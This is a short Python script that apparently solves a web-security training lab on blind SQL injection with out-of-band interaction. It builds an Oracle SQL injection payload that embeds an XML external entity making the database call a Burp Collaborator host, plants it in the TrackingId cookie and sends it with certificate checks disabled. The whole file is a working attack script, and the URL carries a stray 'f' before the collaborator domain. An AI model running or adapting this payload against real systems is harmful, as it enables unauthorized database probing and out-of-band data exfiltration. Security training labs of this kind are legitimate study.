from colorama import Fore
import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind SQL injection with out-of-band interaction"

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'TrackingId' cookie to make a DNS lookup to your burp collaborator domain\n2. Check your collaborator for incoming traffic\n""")
    
    # Prompt for collaborator domain
    collaborator = input(Fore.YELLOW + "[?] Enter your Burp Collaborator domain: ").strip()
    
    # Prepare SQLi payload
    payload = (
        f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        f"<!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://f{collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -"
    )

    # Setup session and cookies
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        print(Fore.WHITE + "[+] Sending request with payload in TrackingId...")
        session.cookies.set("TrackingId", payload)
        session.get(url.rstrip("/") + "/filter?category=Pets")
    except Exception as e:
        print(Fore.RED + f"[!] Request failed: {e}")
        return False

    print("[+] Payload delivered. Check your Burp Collaborator for DNS interaction.")
    return True
